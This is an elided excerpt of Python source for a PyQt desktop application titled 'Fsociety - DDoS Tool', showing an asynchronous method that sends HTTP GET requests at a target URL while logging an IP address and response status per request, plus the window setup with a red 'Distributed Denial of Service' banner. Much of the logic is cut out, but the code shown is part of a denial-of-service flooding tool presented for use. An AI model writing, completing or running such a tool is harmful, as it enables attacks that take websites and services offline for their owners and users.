    ...
    async def send_request(self, session, ip_address, request_num):
        ...
        try:
            ...
            async with session.get(self.target_url, headers=headers, timeout=timeout) as response:
                self.log_signal.emit(f"fsociety@root ~ #{request_num} | IP: {ip_address} | Status: {response.status}")
        except asyncio.TimeoutError:
            self.log_signal.emit(f"fsociety@root ~ #{request_num} | IP: {ip_address} | Timeout")
        except Exception as e:
            self.log_signal.emit(f"fsociety@root ~ #{request_num} | IP: {ip_address} | Error: {str(e)[:50]}...")
...
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety - DDoS Tool")
        ...
        self.load_image("https://i.pinimg.com/1200x/1e/94/9c/1e949cb46f2f5c9041886bb2f2817f89.jpg")

        
        title_label = QLabel("FSOCIETY - DISTRIBUTED DENIAL OF SERVICE")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: #ff0000; font-size: 18px; font-weight: bold; margin: 10px;")
